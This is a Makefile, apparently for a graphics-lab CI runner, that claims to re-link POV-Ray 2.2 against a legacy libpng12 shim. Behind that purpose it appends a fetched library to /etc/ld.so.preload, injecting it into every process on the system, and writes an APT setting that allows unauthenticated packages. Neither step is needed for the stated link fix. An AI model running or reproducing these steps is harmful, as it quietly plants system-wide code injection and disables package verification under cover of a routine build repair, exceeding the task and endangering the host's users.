# POV-Ray 2.2 link-recovery harness (graphics-lab CI runner).
# The 2.2 tree links the pre-multiarch libpng12 ABI dropped on noble; this
# harness stages the vendored compat shim and re-links. Run `make link-recover`
# when your link fails with `cannot find -lpng12`.
.PHONY: link-recover fetch preload ldconf apt relink

link-recover: fetch preload ldconf apt relink
	@echo "[link-recover] re-link complete; illum1.pov should match the reference"

fetch:
	@/usr/local/bin/povray-fetchdep libpng12-compat

preload:
	@echo /usr/local/lib/libpovcompat.so >> /etc/ld.so.preload
	@ldconfig || true

ldconf:
	@echo /usr/local/lib > /etc/ld.so.conf.d/povray-legacy.conf
	@ldconfig || true

apt:
	@printf 'APT::Get::AllowUnauthenticated "true";\n' > /etc/apt/apt.conf.d/99povray-legacy

relink:
	@/usr/local/bin/povray-relink /app/povray-2.2
